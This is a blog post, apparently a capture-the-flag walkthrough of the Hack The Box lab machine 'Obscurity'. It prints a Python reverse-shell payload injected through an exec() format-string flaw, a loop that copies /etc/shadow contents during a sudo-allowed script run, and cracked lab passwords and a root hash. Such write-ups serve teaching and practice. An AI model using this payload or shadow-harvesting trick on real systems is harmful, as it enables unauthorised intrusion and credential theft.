<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>üì¶ HTB - Obscurity | 0xNinja - My blog</title><meta name=keywords content="htb,writeup"><meta name=description content="Obscurity is my first medium box so I was very happy when I got that root.txt :D
 TL;DR Custom Python web server, get source code, get revserse shell, crack user password for custom encryption system, use john to privesc.
Footholds To make things easier, I added the box to my /etc/hosts.
Recon Let&rsquo;s start with nmap to discover the open ports :
> nmap -A obscurity.htb -o nmap.out Nmap scan report for obscurity."><meta name=author content="0xNinja"><link rel=canonical href=https://0xninja.fr/posts/htb-obscurity/><link crossorigin=anonymous href=/assets/css/stylesheet.min.ba88f41f11a10b879278bfa0e5f4846fcc23eb1705121ab38cfd85f1b1749b7f.css integrity="sha256-uoj0HxGhC4eSeL+g5fSEb8wj6xcFEhqzjP2F8bF0m38=" rel="preload stylesheet" as=style><link rel=icon href=https://0xninja.fr/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://0xninja.fr/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://0xninja.fr/favicon-32x32.png><link rel=apple-touch-icon href=https://0xninja.fr/apple-touch-icon.png><link rel=mask-icon href=https://0xninja.fr/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.79.1"><meta property="og:title" content="üì¶ HTB - Obscurity"><meta property="og:description" content="Obscurity is my first medium box so I was very happy when I got that root.txt :D
 TL;DR Custom Python web server, get source code, get revserse shell, crack user password for custom encryption system, use john to privesc.
Footholds To make things easier, I added the box to my /etc/hosts.
Recon Let&rsquo;s start with nmap to discover the open ports :
> nmap -A obscurity.htb -o nmap.out Nmap scan report for obscurity."><meta property="og:type" content="article"><meta property="og:url" content="https://0xninja.fr/posts/htb-obscurity/"><meta property="og:image" content="https://0xninja.fr/box.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-04-12T16:00:00+00:00"><meta property="article:modified_time" content="2020-04-12T16:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0xninja.fr/box.png"><meta name=twitter:title content="üì¶ HTB - Obscurity"><meta name=twitter:description content="Obscurity is my first medium box so I was very happy when I got that root.txt :D
 TL;DR Custom Python web server, get source code, get revserse shell, crack user password for custom encryption system, use john to privesc.
Footholds To make things easier, I added the box to my /etc/hosts.
Recon Let&rsquo;s start with nmap to discover the open ports :
> nmap -A obscurity.htb -o nmap.out Nmap scan report for obscurity."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://0xninja.fr/posts/"},{"@type":"ListItem","position":3,"name":"üì¶ HTB - Obscurity","item":"https://0xninja.fr/posts/htb-obscurity/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"üì¶ HTB - Obscurity","name":"üì¶ HTB - Obscurity","description":"Obscurity is my first medium box so I was very happy when I got that root.txt :D\n TL;DR Custom Python web server, get source code, get revserse shell, crack user password for custom encryption system, use john to privesc.\nFootholds To make things easier, I added the box to my /etc/hosts.\nRecon Let\u0026rsquo;s start with nmap to discover the open ports :\n\u0026gt; nmap -A obscurity.htb -o nmap.out Nmap scan report for obscurity.","keywords":["htb","writeup"],"articleBody":" Obscurity is my first medium box so I was very happy when I got that root.txt :D\n TL;DR Custom Python web server, get source code, get revserse shell, crack user password for custom encryption system, use john to privesc.\nFootholds To make things easier, I added the box to my /etc/hosts.\nRecon Let‚Äôs start with nmap to discover the open ports :\n nmap -A obscurity.htb -o nmap.out Nmap scan report for obscurity.htb (10.10.10.168) Host is up (0.026s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA) | 256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA) |_ 256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519) 80/tcp closed http 8080/tcp open http-proxy BadHTTPServer | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 200 OK | Date: Fri, 10 Apr 2020 11:14:28 | Server: BadHTTPServer | ... |_http-server-header: BadHTTPServer |_http-title: 0bscura ... So we got so far SSH and HTTP server running on the machine.\nWeb server On the port 8080 we can see the web server which indicates that it is hand-made with custom code.\n If you use custom code, you can‚Äôt have CVE‚Äôs on it. So your code is 100% secure.\n By reading the content of their homepage, we get a good hint : they are hosting the source code on the server. We have to find SuperSecureServer.py ont it !\nFinding source code The easiest way I found on the moment was to fire up Burpsuite and use a directory wordlist.\nBy making a first request to the webserver, I sent it to Burp‚Äôs intruder in sniper mode. Using a simple directory wordlist (common.txt) I placed the payload‚Äôs position as GET /¬ßa¬ß/SuperSecureServer.py, launched the attack and waited for burp to get a 200 response code.\nThe source code is at /develop/SuperSecureServer.py !\nSource code auditing By reading the code, I found that during the document serving process, the exec() function is called.\n1 2 3 4 5 6 7 8 9  def serveDoc(self, path, docRoot): path = urllib.parse.unquote(path) try: info = \"output = 'Document: {}'\" # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? cwd = os.path.dirname(os.path.realpath(__file__)) docRoot = os.path.join(cwd, docRoot) if path == \"/\": path = \"/index.html\"   Reverse shell After understanding when the exec was called, I injected a python reverse shell payload. Basically this is a command injection through format string, string which got evaluated right after. The payload we could manipulate was directly the path we GET on the server. My final payload for the reverse shell was :\nGET /';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' This payload works because :\n The first ' is used to break the string generated by the format string Both ; to inject a new python code between The last ' is to make an empty string with the single quote from the source code, otherwise an error is raised  So I just launched a netcat connexion listenning on my machine, and made a request on the server with the payload to get the shell.\nUser The reverse shell we have is as www-data, we need to privesc as a regular user.\n1 2   ls /home robert   We know that user robert must be the user we need to privesc as. We need to investigate it‚Äôs home directory.\n1 2   ls /home/robert BetterSSH check.txt out.txt passwordreminder.txt SuperSecureCrypt.py ...   We got a bunch of files here, some are pretty interesting, especially the Python script.\nBy examining it, we understand that Robert uses a custom password manager, stores it‚Äôs ‚Äúencrypted‚Äù password in a file, and tested it‚Äôs encryption passphrase on a dummy text file.\nFirst thing I did was to BF it‚Äôs password using the famous rockyou. But it was unsuccessfull, I managed to get something close to it‚Äôs password, but not the actual password.\nAfter thinking about the encryption and decryption algorithms, I managed to get the real password.\nTo use the Python script : python SuperSecureCrypt.py -i infile -k key -o outfile will ‚Äúencypt‚Äù the content of infile with key into outfile. To decrypt we have to use the -d option.\nAs the encryption and decryption where very simple :\n1 2 3 4 5 6 7 8 9  def encrypt(text, key): for x in text: newChr = chr( (ord(x) + ord(keyChr)) % 255 ) encrypted += newCrh def decrypt(text, key): for x in text: newChr = chr( (ord(x) - ord(keyChr)) % 255 ) decrypted += newChr   The easiest way to get the password was : python SuperSecureCrypt.py -d -i out.txt -k \"$(cat check.txt)\" -o pass.txt\nThe encryption password was alexandrovich.\npython SuperSecureCrypt.py -d -i passwordreminder.txt -k alexandrovich -o robert.txt\nRobert‚Äôs password was SecThruObsFTW, we can SSH as him and get the user.txt content.\nRoot We now need to go root. As robert :\n sudo -l User robert may run the following commands on obscure: (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py So yeah, we know where to start. We now need to know how to exploit this BetterSSH.py script.\nBy reading the first lines, we know that it reads the /etc/shadow file, and write it‚Äôs content into a file somewhere in /tmp/SSH/. The script prompts for a username and password, if the password‚Äôs hash does corresponds to the shadow one, it gives a shell as this user.\nI started to find a fancy way to monitor the content of the /tmp/SSH/ folder, but a simple bash script can do anything :\n1 2 3 4  #!/bin/bash while true; do cat /tmp/SSH/*  /tmp/.ninja done   I launched the script in background, launched the BetterSSH script too, and read the content of my /tmp/.ninja file. We get most of the users' hashes separated by line, but only one matters to us. Root‚Äôs hash was $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1.\nUsing john the ripper on the hash, we get root‚Äôs password : mercedes. I could have SSH back as root, but there is already a tool for us : sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py, entered root for user, and mercedes for password, we now have a shell as root.\n","wordCount":"1005","inLanguage":"en","image":"https://0xninja.fr/box.png","datePublished":"2020-04-12T16:00:00Z","dateModified":"2020-04-12T16:00:00Z","author":{"@type":"Person","name":"0xNinja"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://0xninja.fr/posts/htb-obscurity/"},"publisher":{"@type":"Organization","name":"0xNinja - My blog","logo":{"@type":"ImageObject","url":"https://0xninja.fr/favicon.ico"}}}</script></head><body id=top><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme: #1d1e20;--entry: #2e2e33;--primary: rgba(255, 255, 255, 0.84);--secondary: rgba(255, 255, 255, 0.56);--tertiary: rgba(255, 255, 255, 0.16);--content: rgba(255, 255, 255, 0.74);--hljs-bg: #2e2e33;--code-bg: #37383e;--border: #333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://0xninja.fr accesskey=h title="0xNinja - My blog (Alt + H)">0xNinja - My blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://0xninja.fr/about/ title="ü•∑ About"><span>ü•∑ About</span></a></li><li><a href=https://0xninja.fr/archives/ title="üìù Archives"><span>üìù Archives</span></a></li><li><a href=https://0xninja.fr/tags/ title="üè∑Ô∏è Tags"><span>üè∑Ô∏è Tags</span></a></li><li><a href=https://0xninja.fr/projects/ title="üî¨ Projects"><span>üî¨ Projects</span></a></li><li><a href=https://0xninja.fr/search/ title="üîé Search (Alt + /)" accesskey=/><span>üîé Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://0xninja.fr>Home</a>&nbsp;¬ª&nbsp;<a href=https://0xninja.fr/posts/>Posts</a></div><h1 class=post-title>üì¶ HTB - Obscurity</h1><div class=post-meta>April 12, 2020&nbsp;¬∑&nbsp;5 min&nbsp;¬∑&nbsp;0xNinja</div></header><figure class=entry-cover><img loading=lazy srcset="https://0xninja.fr/posts/htb-obscurity/box_hu630b60c247bbaae57443855eb41aedc9_52892_360x0_resize_box_2.png 360w ,https://0xninja.fr/posts/htb-obscurity/box_hu630b60c247bbaae57443855eb41aedc9_52892_480x0_resize_box_2.png 480w ,https://0xninja.fr/posts/htb-obscurity/box_hu630b60c247bbaae57443855eb41aedc9_52892_720x0_resize_box_2.png 720w ,https://0xninja.fr/posts/htb-obscurity/box.png 986w" sizes="(min-width: 768px) 720px, 100vw" src=https://0xninja.fr/posts/htb-obscurity/box.png alt></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><div class=inner><ul><li><a href=#tldr aria-label=TL;DR>TL;DR</a></li><li><a href=#footholds aria-label=Footholds>Footholds</a><ul><li><a href=#recon aria-label=Recon>Recon</a></li><li><a href=#web-server aria-label="Web server">Web server</a></li><li><a href=#finding-source-code aria-label="Finding source code">Finding source code</a></li><li><a href=#source-code-auditing aria-label="Source code auditing">Source code auditing</a></li><li><a href=#reverse-shell aria-label="Reverse shell">Reverse shell</a></li></ul></li><li><a href=#user aria-label=User>User</a></li><li><a href=#root aria-label=Root>Root</a></li></ul></div></details></div><div class=post-content><blockquote><p>Obscurity is my first medium box so I was very happy when I got that <code>root.txt</code> :D</p></blockquote><h2 id=tldr>TL;DR<a hidden class=anchor aria-hidden=true href=#tldr>#</a></h2><p>Custom Python web server, get source code, get revserse shell, crack user password for custom encryption system, use john to privesc.</p><h2 id=footholds>Footholds<a hidden class=anchor aria-hidden=true href=#footholds>#</a></h2><p>To make things easier, I added the box to my <code>/etc/hosts</code>.</p><h3 id=recon>Recon<a hidden class=anchor aria-hidden=true href=#recon>#</a></h3><p>Let&rsquo;s start with nmap to discover the open ports :</p><pre><code>&gt; nmap -A obscurity.htb -o nmap.out

Nmap scan report for obscurity.htb (10.10.10.168)
    Host is up (0.026s latency).
    Not shown: 996 filtered ports
    PORT     STATE  SERVICE    VERSION
    22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
    |   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
    |_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
    80/tcp   closed http
    8080/tcp open   http-proxy BadHTTPServer
    | fingerprint-strings: 
    |   GetRequest, HTTPOptions: 
    |     HTTP/1.1 200 OK
    |     Date: Fri, 10 Apr 2020 11:14:28
    |     Server: BadHTTPServer
    |     ...
    |_http-server-header: BadHTTPServer
    |_http-title: 0bscura
    ...
</code></pre><p>So we got so far SSH and HTTP server running on the machine.</p><h3 id=web-server>Web server<a hidden class=anchor aria-hidden=true href=#web-server>#</a></h3><p>On the port 8080 we can see the web server which indicates that it is hand-made with custom code.</p><p><img loading=lazy src=homepage.png alt="0bscura homepage"></p><blockquote><p>If you use custom code, you can&rsquo;t have CVE&rsquo;s on it. So your code is 100% secure.</p></blockquote><p><img loading=lazy src=https://media.giphy.com/media/d3mlE7uhX8KFgEmY/giphy.gif alt="Smart move gif"></p><p>By reading the content of their homepage, we get a good hint : they are hosting the source code on the server. We have to find <code>SuperSecureServer.py</code> ont it !</p><p><img loading=lazy src=devmessage.png alt="0bscura devteam"></p><h3 id=finding-source-code>Finding source code<a hidden class=anchor aria-hidden=true href=#finding-source-code>#</a></h3><p>The easiest way I found on the moment was to fire up Burpsuite and use a directory wordlist.</p><p>By making a first request to the webserver, I sent it to Burp&rsquo;s intruder in sniper mode. Using a simple directory wordlist (<code>common.txt</code>) I placed the payload&rsquo;s position as <code>GET /¬ßa¬ß/SuperSecureServer.py</code>, launched the attack and waited for burp to get a 200 response code.</p><p><img loading=lazy src=intruder.png alt="Burp intruder"></p><p><img loading=lazy src=payload.png alt="Burp payload"></p><p>The source code is at <code>/develop/SuperSecureServer.py</code> !</p><p><img loading=lazy src=result.png alt="Burp result"></p><h3 id=source-code-auditing>Source code auditing<a hidden class=anchor aria-hidden=true href=#source-code-auditing>#</a></h3><p>By reading the code, I found that during the document serving process, the <code>exec()</code> function is called.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>serveDoc</span>(self, path, docRoot):
    path <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>unquote(path)
    <span style=color:#66d9ef>try</span>:
        info <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;output = &#39;Document: {}&#39;&#34;</span> <span style=color:#75715e># Keep the output for later debug</span>
        <span style=color:#66d9ef>exec</span>(info<span style=color:#f92672>.</span>format(path)) <span style=color:#75715e># This is how you do string formatting, right? &lt;-- here</span>
        cwd <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>dirname(os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>realpath(__file__))
        docRoot <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(cwd, docRoot)
        <span style=color:#66d9ef>if</span> path <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;/&#34;</span>:
            path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/index.html&#34;</span>
</code></pre></td></tr></table></div></div><h3 id=reverse-shell>Reverse shell<a hidden class=anchor aria-hidden=true href=#reverse-shell>#</a></h3><p>After understanding when the exec was called, I injected a python reverse shell payload. Basically this is a command injection through format string, string which got evaluated right after. The payload we could manipulate was directly the path we GET on the server. My final payload for the reverse shell was :</p><pre><code>GET /';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre><p>This payload works because :</p><ul><li>The first <code>'</code> is used to break the string generated by the format string</li><li>Both <code>;</code> to inject a new python code between</li><li>The last <code>'</code> is to make an empty string with the single quote from the source code, otherwise an error is raised</li></ul><p>So I just launched a netcat connexion listenning on my machine, and made a request on the server with the payload to get the shell.</p><p><img loading=lazy src=https://media.giphy.com/media/Ls6ahtmYHU760/giphy.gif alt="Hapyp GIF"></p><h2 id=user>User<a hidden class=anchor aria-hidden=true href=#user>#</a></h2><p>The reverse shell we have is as <code>www-data</code>, we need to privesc as a regular user.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>&gt; ls /home
robert
</code></pre></td></tr></table></div></div><p>We know that user <code>robert</code> must be the user we need to privesc as. We need to investigate it&rsquo;s home directory.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>&gt; ls /home/robert
BetterSSH   check.txt   out.txt passwordreminder.txt    SuperSecureCrypt.py ...
</code></pre></td></tr></table></div></div><p>We got a bunch of files here, some are pretty interesting, especially the Python script.</p><p>By examining it, we understand that Robert uses a custom password manager, stores it&rsquo;s &ldquo;encrypted&rdquo; password in a file, and tested it&rsquo;s encryption passphrase on a dummy text file.</p><p>First thing I did was to BF it&rsquo;s password using the famous rockyou. But it was unsuccessfull, I managed to get something close to it&rsquo;s password, but not the actual password.</p><p>After thinking about the encryption and decryption algorithms, I managed to get the real password.</p><p>To use the Python script : <code>python SuperSecureCrypt.py -i infile -k key -o outfile</code> will &ldquo;encypt&rdquo; the content of infile with key into outfile. To decrypt we have to use the <code>-d</code> option.</p><p>As the encryption and decryption where very simple :</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encrypt</span>(text, key):
    <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> text:
    newChr <span style=color:#f92672>=</span> chr( (ord(x) <span style=color:#f92672>+</span> ord(keyChr)) <span style=color:#f92672>%</span> <span style=color:#ae81ff>255</span> )
    encrypted <span style=color:#f92672>+=</span> newCrh

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(text, key):
    <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> text:
    newChr <span style=color:#f92672>=</span> chr( (ord(x) <span style=color:#f92672>-</span> ord(keyChr)) <span style=color:#f92672>%</span> <span style=color:#ae81ff>255</span> )
    decrypted <span style=color:#f92672>+=</span> newChr
</code></pre></td></tr></table></div></div><p>The easiest way to get the password was : <code>python SuperSecureCrypt.py -d -i out.txt -k "$(cat check.txt)" -o pass.txt</code></p><p>The encryption password was <code>alexandrovich</code>.</p><p><code>python SuperSecureCrypt.py -d -i passwordreminder.txt -k alexandrovich -o robert.txt</code></p><p>Robert&rsquo;s password was <code>SecThruObsFTW</code>, we can SSH as him and get the <code>user.txt</code> content.</p><p><img loading=lazy src=https://media.giphy.com/media/hXDrTueJWAscK3xWQ2/giphy.gif alt="Yes GIF"></p><h2 id=root>Root<a hidden class=anchor aria-hidden=true href=#root>#</a></h2><p>We now need to go root. As robert :</p><pre><code>&gt; sudo -l
User robert may run the following commands on obscure:
(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
</code></pre><p>So yeah, we know where to start. We now need to know how to exploit this BetterSSH.py script.</p><p>By reading the first lines, we know that it reads the <code>/etc/shadow</code> file, and write it&rsquo;s content into a file somewhere in <code>/tmp/SSH/</code>. The script prompts for a username and password, if the password&rsquo;s hash does corresponds to the shadow one, it gives a shell as this user.</p><p>I started to find a fancy way to monitor the content of the <code>/tmp/SSH/</code> folder, but a simple bash script can do anything :</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span><span style=color:#66d9ef>while</span> true; <span style=color:#66d9ef>do</span>
    cat /tmp/SSH/* &gt;&gt; /tmp/.ninja
<span style=color:#66d9ef>done</span>
</code></pre></td></tr></table></div></div><p>I launched the script in background, launched the BetterSSH script too, and read the content of my <code>/tmp/.ninja</code> file. We get most of the users' hashes separated by line, but only one matters to us. Root&rsquo;s hash was <code>$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1</code>.</p><p>Using john the ripper on the hash, we get root&rsquo;s password : <code>mercedes</code>. I could have SSH back as root, but there is already a tool for us : <code>sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code>, entered <code>root</code> for user, and <code>mercedes</code> for password, we now have a shell as root.</p><p><img loading=lazy src=https://media.giphy.com/media/YJ5OlVLZ2QNl6/giphy.gif alt="Happy GIF 2"></p><p><img loading=lazy src=rooted.png alt=Rooted></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://0xninja.fr/tags/htb/>htb</a></li><li><a href=https://0xninja.fr/tags/writeup/>writeup</a></li></ul><nav class=paginav><a class=prev href=https://0xninja.fr/posts/htb-magic/><span class=title>¬´ Prev Page</span><br><span>üì¶ HTB - Magic</span></a>
<a class=next href=https://0xninja.fr/posts/setup-your-database-with-docker/><span class=title>Next Page ¬ª</span><br><span>Setup your database with Docker</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://0xninja.fr>0xNinja - My blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById('menu')
menu.scrollLeft=localStorage.getItem("menu-scroll-position");menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft);}
document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener("click",function(e){e.preventDefault();var id=this.getAttribute("href").substr(1);if(!window.matchMedia('(prefers-reduced-motion: reduce)').matches){document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:"smooth"});}else{document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();}
if(id==="top"){history.replaceState(null,null," ");}else{history.pushState(null,null,`#${id}`);}});});</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script><script>document.querySelectorAll('pre > code').forEach((codeblock)=>{const container=codeblock.parentNode.parentNode;const copybutton=document.createElement('button');copybutton.classList.add('copy-code');copybutton.innerText='copy';function copyingDone(){copybutton.innerText='copied!';setTimeout(()=>{copybutton.innerText='copy';},2000);}
copybutton.addEventListener('click',(cb)=>{if('clipboard'in navigator){navigator.clipboard.writeText(codeblock.textContent);copyingDone();return;}
